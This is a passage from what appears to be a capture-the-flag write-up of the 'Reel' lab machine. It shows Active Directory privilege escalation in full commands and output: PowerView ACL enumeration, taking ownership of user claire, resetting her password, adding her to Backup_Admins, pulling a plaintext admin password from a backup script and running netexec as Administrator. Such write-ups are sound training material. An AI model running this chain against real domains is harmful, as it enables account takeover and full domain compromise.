05/29/2018  09:02 PM    <DIR>          ..                                                                                          
05/30/2018  12:44 AM    <DIR>          BloodHound                                                                                  
05/29/2018  09:02 PM               182 note.txt                                                                                    
              1 File(s)            182 bytes                                                                                      
              3 Dir(s)   4,982,509,568 bytes free                                                                                 
  
tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                                                               
Findings:                                                                                                                          
  
Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                     
  
Maybe we should re-run Cypher query against other groups we've created.

tom@REEL C:\Users\tom\Desktop\AD Audit>cd BloodHound                                                                               
  
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir                                                                              
Volume in drive C has no label.                                                                                                   
Volume Serial Number is CEBA-B613                                                                                                 
  
Directory of C:\Users\tom\Desktop\AD Audit\BloodHound                                                                             
  
05/30/2018  12:44 AM    <DIR>          .                                                                                           
05/30/2018  12:44 AM    <DIR>          ..                                                                                          
05/29/2018  08:57 PM    <DIR>          Ingestors                                                                                   
10/30/2017  11:15 PM           769,587 PowerView.ps1                                                                               
              1 File(s)        769,587 bytes                                                                                      
              3 Dir(s)   4,980,871,168 bytes free
```

We then use `PowerView` :

```PowerShell
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>powershell -nop -ep bypass -c ". 'C:\Users\tom\Desktop\AD Audit\BloodHound\Pow  
erView.ps1'; Get-DomainGroup | Select-Object -ExpandProperty Name"                                                                 
WinRMRemoteWMIUsers__                                                                                                              
Administrators                                                                                                                     
Users                                                                                                                              
Guests                                                                                                                             
Print Operators                                                                                                                    
Backup Operators                                                                                                                   
Replicator                                                                                                                         
Remote Desktop Users                                                                                                               
Network Configuration Operators                                                                                                    
Performance Monitor Users                                                                                                          
Performance Log Users                                                                                                              
Distributed COM Users                                                                                                              
IIS_IUSRS                                                                                                                          
Cryptographic Operators                                                                                                            
Event Log Readers                                                                                                                  
Certificate Service DCOM Access                                                                                                    
RDS Remote Access Servers                                                                                                          
RDS Endpoint Servers                                                                                                               
RDS Management Servers                                                                                                             
Hyper-V Administrators                                                                                                             
Access Control Assistance Operators                                                                                                
Remote Management Users                                                                                                            
Domain Computers                                                                                                                   
Domain Controllers                                                                                                                 
Schema Admins                                                                                                                      
Enterprise Admins                                                                                                                  
Cert Publishers                                                                                                                    
Domain Admins                                                                                                                      
Domain Users                                                                                                                       
Domain Guests                                                                                                                      
Group Policy Creator Owners                                                                                                        
RAS and IAS Servers                                                                                                                
Server Operators                                                                                                                   
Account Operators                                                                                                                  
Pre-Windows 2000 Compatible Access                                                                                                 
Incoming Forest Trust Builders                                                                                                     
Windows Authorization Access Group                                                                                                 
Terminal Server License Servers                                                                                                    
Allowed RODC Password Replication Group                                                                                            
Denied RODC Password Replication Group                                                                                             
Read-only Domain Controllers                                                                                                       
Enterprise Read-only Domain Controllers                                                                                            
Cloneable Domain Controllers                                                                                                       
Protected Users                                                                                                                    
DnsAdmins                                                                                                                          
DnsUpdateProxy                                                                                                                     
Exchange Install Domain Servers                                                                                                    
Backup_Admins                                                                                                                      
AppLocker_Test                                                                                                                     
SharePoint_Admins                                                                                                                  
DR_Site                                                                                                                            
SQL_Admins                                                                                                                         
HelpDesk_Admins                                                                                                                    
Restrictions                                                                                                                       
All_Staff                                                                                                                          
MegaBank_Users                                                                                                                     
Finance_Users                                                                                                                      
HR_Team

tom@REEL C:\Users\tom\Downloads>powershell -nop -c "$b='LDAP://REEL/OU=Groups,DC=HTB,DC=LOCAL'; $s=New-Object DirectoryServices.  
DirectorySearcher([adsi]$b); $s.Filter='(objectClass=Group)'; $s.FindAll() | ForEach-Object { $_.Properties.name }"                
Backup_Admins                                                                                                                      
AppLocker_Test                                                                                                                     
SharePoint_Admins                                                                                                                  
DR_Site                                                                                                                            
SQL_Admins                                                                                                                         
HelpDesk_Admins                                                                                                                    
Restrictions                                                                                                                       
All_Staff                                                                                                                          
MegaBank_Users                                                                                                                     
Finance_Users                                                                                                                      
HR_Team
```

We continue using `PowerView` to get from `Backup_Admins` the rights on the group :

```PowerShell
tom@REEL C:\Users\tom\Downloads>powershell -nop -ep bypass -c ". 'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'; Get-D  
omainObjectAcl -Identity 'Backup_Admins' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'Write|GenericAll|Own|Wr  
iteDacl|WriteOwner' } | Select-Object SecurityIdentifier, IdentityReference, ActiveDirectoryRights, ObjectType"                    
  
SecurityIdentifier              IdentityReference                         ActiveDirectoryRights ObjectType                         
------------------              -----------------                         --------------------- ----------                         
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                   WriteProperty                                    
S-1-5-21-2648318136-36885712...                                                      GenericAll                                    
S-1-5-21-2648318136-36885712...                                                      GenericAll                                    
S-1-5-10                                                                          WriteProperty                                    
S-1-5-21-2648318136-36885712...                                   DeleteTree, Delete, WriteDacl                                    
S-1-5-21-2648318136-36885712...                                   DeleteTree, Delete, WriteDacl                                    
S-1-5-10                                                            ReadProperty, WriteProperty                                    
S-1-5-10                                                        ...WriteProperty, ExtendedRight                                    
S-1-5-21-2648318136-36885712...                                                      GenericAll                                    
S-1-5-21-2648318136-36885712...                                 ...y, GenericExecute, WriteDacl                                    
S-1-5-21-2648318136-36885712...                                 ...y, GenericExecute, WriteDacl                                    
S-1-5-21-2648318136-36885712...                                 ...y, GenericExecute, WriteDacl                                    
S-1-5-21-2648318136-36885712...                                                      GenericAll                                    
S-1-5-32-548                                                                         GenericAll                                    
S-1-5-32-544                                                    ...cRead, WriteDacl, WriteOwner                                    
S-1-5-18                                                                             GenericAll
```

So we only got `SIDs`. We try to find the user in the group :

```PowerShell
om@REEL C:\Users\tom\Downloads>powershell -nop -ep bypass -c ". 'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'; Get-D  
omainGroupMember -Identity 'Backup_Admins' | Select-Object MemberName"                                                             
  
MemberName                                                                                                                         
----------                                                                                                                         
ranj
```

`ranj` it is.

We convert the `SIDs` :

```PowerShell
tom@REEL C:\Users\tom\Downloads>powershell -nop -ep bypass -c ". 'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'; Get-D  
omainObjectAcl -Identity 'Backup_Admins' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'WriteDacl|GenericAll' -  
and $_.SecurityIdentifier -match 'S-1-5-21' } | ForEach-Object { [PSCustomObject]@{ Trustee = (ConvertFrom-SID $_.SecurityIdenti  
fier); Rights = $_.ActiveDirectoryRights } } | Format-Table -AutoSize"                                                             
  
Trustee                                                               Rights                                                       
-------                                                               ------                                                       
                                                                 GenericAll                                                       
                                                                 GenericAll                                                       
                                              DeleteTree, Delete, WriteDacl                                                       
                                              DeleteTree, Delete, WriteDacl                                                       
HTB\Domain Admins                                                 GenericAll                                                       
HTB\claire            ReadProperty, WriteProperty, GenericExecute, WriteDacl                                                       
HTB\herman            ReadProperty, WriteProperty, GenericExecute, WriteDacl                                                       
HTB\julia             ReadProperty, WriteProperty, GenericExecute, WriteDacl                                                       
HTB\Enterprise Admins                                             GenericAl
```

And we find out `tom` can `WriteOwner` on user `claire` :

```PowerShell
tom@REEL C:\Users\tom\Downloads>powershell -nop -ep bypass -c ". 'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'; Get-D  
omainObjectAcl -Identity claire -ResolveGUIDs | Where-Object { (ConvertFrom-SID $_.SecurityIdentifier) -match 'tom' -and $_.Acti  
veDirectoryRights -match 'WriteOwner|GenericAll|WriteDacl|ExtendedRight' } | ForEach-Object { [PSCustomObject]@{ Trustee=(Conver  
tFrom-SID $_.SecurityIdentifier); Rights=$_.ActiveDirectoryRights; Type=$_.ObjectType } }"                                         
  
Trustee                                                                        Rights Type                                         
-------                                                                        ------ ----                                         
HTB\tom                                                                    WriteOwner
```

So we put `claire` inside the `Backup_Admins` :

```bash
PS C:\Users\tom\Downloads> . 'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'                                              
PS C:\Users\tom\Downloads> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                                               
PS C:\Users\tom\Downloads> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                 
PS C:\Users\tom\Downloads> $pw = ConvertTo-SecureString 'Sup3rS3cr3t!' -AsPlainText -Force                                         
PS C:\Users\tom\Downloads> Set-DomainUserPassword -Identity claire -AccountPassword $pw                                            
PS C:\Users\tom\Downloads> $cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $pw)                         
PS C:\Users\tom\Downloads> Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $cred                     
PS C:\Users\tom\Downloads> Get-DomainGroupMember -Identity Backup_Admins | Select MemberName                                       
  
MemberName                                                                                                                         
----------                                                                                                                         
ranj                                                                                                                               
claire
```

We `ssh` into `claire` with `Sup3rS3cr3t!`

```Bash
>  ssh claire@10.129.20.161  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
claire@10.129.20.161's password:    
Microsoft Windows [Version 6.3.9600]                                                                                               
(c) 2013 Microsoft Corporation. All rights reserved. 
```

We can check the `backups` as `Backup_Admin` :
```PowerShell                                                                              
claire@REEL C:\Users\claire>cd "C:\Users\Administrator\Desktop\Backup Scripts"                                                     
  
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>                                                                         
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                                                      
Volume in drive C has no label.                                                                                                   
Volume Serial Number is CEBA-B613                                                                                                 
  
Directory of C:\Users\Administrator\Desktop\Backup Scripts                                                                        
  
11/02/2017  10:47 PM    <DIR>          .                                                                                           
11/02/2017  10:47 PM    <DIR>          ..                                                                                          
11/04/2017  12:22 AM               845 backup.ps1                                                                                  
11/02/2017  10:37 PM               462 backup1.ps1                                                                                 
11/04/2017  12:21 AM             5,642 BackupScript.ps1                                                                            
11/02/2017  10:43 PM             2,791 BackupScript.zip                                                                            
11/04/2017  12:22 AM             1,855 folders-system-state.txt                                                                    
11/04/2017  12:22 AM               308 test2.ps1.txt                                                                               
              6 File(s)         11,903 bytes                                                                                      
              2 Dir(s)   4,979,630,080 bytes free                                                                                 
  
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type backupScript.ps1                                                    
# admin password                                                                                                                   
$password="Cr4ckMeIfYouC4n!"                                                                                                       
  
#Variables, only Change here                                                                                                       
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location                                                                  
$Versions="50" #How many of the last Backups you want to keep                                                                      
$BackupDirs="C:\Program Files\Microsoft\Exchange Server" #What Folders you want to backup                                          
$Log="Log.txt" #Log Name                                                                                                           
$LoggingLevel="1" #LoggingLevel only for Output in Powershell Window, 1=smart, 3=Heavy                                             
  
#STOP-no changes from here                                                                                                         
#STOP-no changes from here                                                                                                         
#Settings - do not change anything from here                                                                                       
$Backupdir=$Destination +"\Backup-"+ (Get-Date -format yyyy-MM-dd)+"-"+(Get-Random -Maximum 100000)+"\"                            
$Items=0                                                                                                                           
$Count=0                                                                                                                           
$ErrorCount=0                                                                                                                      
$StartDate=Get-Date #-format dd.MM.yyyy-HH:mm:ss                                                                                   
  
#FUNCTION                                                                                                                          
#Logging                                                                                                                           
Function Logging ($State, $Message) {                                                                                              
   $Datum=Get-Date -format dd.MM.yyyy-HH:mm:ss                                                                                    
  
   if (!(Test-Path -Path $Log)) {                                                                                                 
       New-Item -Path $Log -ItemType File | Out-Null                                                                              
   }                                                                                                                              
   $Text="$Datum - $State"+":"+" $Message"                                                                                        
  
   if ($LoggingLevel -eq "1" -and $Message -notmatch "was copied") {Write-Host $Text}                                             
   elseif ($LoggingLevel -eq "3" -and $Message -match "was copied") {Write-Host $Text}                                            
                                                                                                                                  
   add-Content -Path $Log -Value $Text                                                                                            
}                                                                                                                                  
Logging "INFO" "----------------------"                                                                                            
Logging "INFO" "Start the Script"                                                                                                  
  
#Create Backupdir                                                                                                                  
Function Create-Backupdir {                                                                                                        
   Logging "INFO" "Create Backupdir $Backupdir"                                                                                   
   New-Item -Path $Backupdir -ItemType Directory | Out-Null                                                                       
  
   Logging "INFO" "Move Log file to $Backupdir"                                                                                   
   Move-Item -Path $Log -Destination $Backupdir                                                                                   
  
   Set-Location $Backupdir                                                                                                        
   Logging "INFO" "Continue with Log File at $Backupdir"                                                                          
}                                                                                                                                  
  
#Delete Backupdir                                                                                                                  
Function Delete-Backupdir {                                                                                                        
   $Folder=Get-ChildItem $Destination | where {$_.Attributes -eq "Directory"} | Sort-Object -Property $_.LastWriteTime -Descend  
ing:$false | Select-Object -First 1                                                                                                
  
   Logging "INFO" "Remove Dir: $Folder"                                                                                           
                                                                                                                                  
   $Folder.FullName | Remove-Item -Recurse -Force                                                                                 
}                                                                                                                                  
  
#Check if Backupdirs and Destination is available                                                                                  
function Check-Dir {                                                                                                               
   Logging "INFO" "Check if BackupDir and Destination exists"                                                                     
   if (!(Test-Path $BackupDirs)) {                                                                                                
       return $false                                                                                                              
       Logging "Error" "$BackupDirs does not exist"                                                                               
   }                                                                                                                              
   if (!(Test-Path $Destination)) {                                                                                               
       return $false                                                                                                              
       Logging "Error" "$Destination does not exist"                                                                              
   }                                                                                                                              
}                                                                                                                                  
  
#Save all the Files                                                                                                                
Function Make-Backup {                                                                                                             
   Logging "INFO" "Started the Backup"                                                                                            
   $Files=@()                                                                                                                     
   $SumMB=0                                                                                                                       
   $SumItems=0                                                                                                                    
   $SumCount=0                                                                                                                    
   $colItems=0                                                                                                                    
   Logging "INFO" "Count all files and create the Top Level Directories"                                                          
  
   foreach ($Backup in $BackupDirs) {                                                                                             
       $colItems = (Get-ChildItem $Backup -recurse | Where-Object {$_.mode -notmatch "h"} | Measure-Object -property length -su  
m)                                                                                                                                 
       $Items=0                                                                                                                   
       $FilesCount += Get-ChildItem $Backup -Recurse | Where-Object {$_.mode -notmatch "h"}                                       
       Copy-Item -Path $Backup -Destination $Backupdir -Force -ErrorAction SilentlyContinue                                       
       $SumMB+=$colItems.Sum.ToString()                                                                                           
       $SumItems+=$colItems.Count                                                                                                 
   }                                                                                                                              
  
   $TotalMB="{0:N2}" -f ($SumMB / 1MB) + " MB of Files"                                                                           
   Logging "INFO" "There are $SumItems Files with  $TotalMB to copy"                                                              
  
   foreach ($Backup in $BackupDirs) {                                                                                             
       $Index=$Backup.LastIndexOf("\")                                                                                            
       $SplitBackup=$Backup.substring(0,$Index)                                                                                   
       $Files = Get-ChildItem $Backup -Recurse | Where-Object {$_.mode -notmatch "h"}                                             
       foreach ($File in $Files) {                                                                                                
           $restpath = $file.fullname.replace($SplitBackup,"")                                                                    
           try {                                                                                                                  
               Copy-Item  $file.fullname $($Backupdir+$restpath) -Force -ErrorAction SilentlyContinue |Out-Null                   
               Logging "INFO" "$file was copied"                                                                                  
           }                                                                                                                      
           catch {                                                                                                                
               $ErrorCount++                                                                                                      
               Logging "ERROR" "$file returned an error an was not copied"                                                        
           }                                                                                                                      
           $Items += (Get-item $file.fullname).Length                                                                             
           $status = "Copy file {0} of {1} and copied {3} MB of {4} MB: {2}" -f $count,$SumItems,$file.Name,("{0:N2}" -f ($Item  
s / 1MB)).ToString(),("{0:N2}" -f ($SumMB / 1MB)).ToString()                                                                       
           $Index=[array]::IndexOf($BackupDirs,$Backup)+1                                                                         
           $Text="Copy data Location {0} of {1}" -f $Index ,$BackupDirs.Count                                                     
           Write-Progress -Activity $Text $status -PercentComplete ($Items / $SumMB*100)                                          
           if ($File.Attributes -ne "Directory") {$count++}                                                                       
       }                                                                                                                          
   }                                                                                                                              
   $SumCount+=$Count                                                                                                              
   $SumTotalMB="{0:N2}" -f ($Items / 1MB) + " MB of Files"                                                                        
   Logging "INFO" "----------------------"                                                                                        
   Logging "INFO" "Copied $SumCount files with $SumTotalMB"                                                                       
   Logging "INFO" "$ErrorCount Files could not be copied"                                                                         
}                                                                                                                                 
  
#Check if Backupdir needs to be cleaned and create Backupdir                                                                       
$Count=(Get-ChildItem $Destination | where {$_.Attributes -eq "Directory"}).count                                                  
Logging "INFO" "Check if there are more than $Versions Directories in the Backupdir"                                               
  
if ($count -lt $Versions) {                                                                                                        
  
   Create-Backupdir                                                                                                               
  
} else {                                                                                                                           
                                                                                                                                  
   Delete-Backupdir                                                                                                               
  
   Create-Backupdir                                                                                                               
}                                                                                                                                  
  
#Check if all Dir are existing and do the Backup                                                                                   
$CheckDir=Check-Dir                                                                                                                
  
if ($CheckDir -eq $false) {                                                                                                        
   Logging "ERROR" "One of the Directory are not available, Script has stopped"                                                   
} else {                                                                                                                           
   Make-Backup                                                                                                                    
  
   $Enddate=Get-Date #-format dd.MM.yyyy-HH:mm:ss                                                                                 
   $span = $EndDate - $StartDate                                                                                                  
   $Minutes=$span.Minutes                                                                                                         
   $Seconds=$Span.Seconds                                                                                                         
                                                                                                                                  
   Logging "INFO" "Backupduration $Minutes Minutes and $Seconds Seconds"                                                          
   Logging "INFO" "----------------------"                                                                                        
   Logging "INFO" "----------------------"                                                                                        
}                                                                                                                                  
  
Write-Host "Press any key to close ..."                                                                                            
$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
```

And we got the `admin` password :

```
# admin password                                                                                                                   
$password="Cr4ckMeIfYouC4n!" 
```

We `netexec` into `admin` to get the root flag :

```bash
>  nxc smb 10.129.20.161 -u Administrator -p 'Cr4ckMeIfYouC4n!' -x "type C:\Users\Administrator\Desktop\root.txt"  
SMB         10.129.20.161   445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)  
SMB         10.129.20.161   445    REEL             [+] HTB.LOCAL\Administrator:Cr4ckMeIfYouC4n! (Pwn3d!)  
SMB         10.129.20.161   445    REEL             [-] WMIEXEC: Dcom initialization failed on connection with stringbinding: "ncacn_ip_tcp:10.129.20.161[49154]", please increase the timeout with the option "--  
dcom-timeout". If it's still failing maybe something is blocking the RPC connection, try another exec method  
SMB         10.129.20.161   445    REEL             [+] Executed command via atexec  
SMB         10.129.20.161   445    REEL             30eeecf*****************11795e09
```

And we got root.
